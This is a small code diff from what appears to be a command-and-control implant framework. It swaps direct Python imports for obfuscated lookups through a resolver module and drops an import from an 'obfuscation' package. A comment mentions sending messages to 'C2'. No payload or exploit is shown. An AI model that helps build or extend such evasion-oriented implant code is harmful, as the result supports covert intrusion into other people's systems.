@@ -1,7 +1,9 @@
 from abc import ABC, abstractmethod
-import os
-import threading
-from typing import Dict, Any, Optional
+from core.resolver import (Resolver, _OS, _THREADING, _TYPING)
+os = Resolver.get_mod(_OS)
+threading = Resolver.get_mod(_THREADING)
+typing_mod = Resolver.get_mod(_TYPING)
+Dict, Any, Optional = typing_mod.Dict, typing_mod.Any, typing_mod.Optional
 
 class BaseModule(ABC):
     """
@@ -39,6 +41,5 @@ class BaseModule(ABC):
         """
         Standardized logging for modules.
         """
-        from core.obfuscation import decrypt_string
         # Can be expanded to send debug messages to C2 or file
         print(f"[{self.__class__.__name__}] {message}")
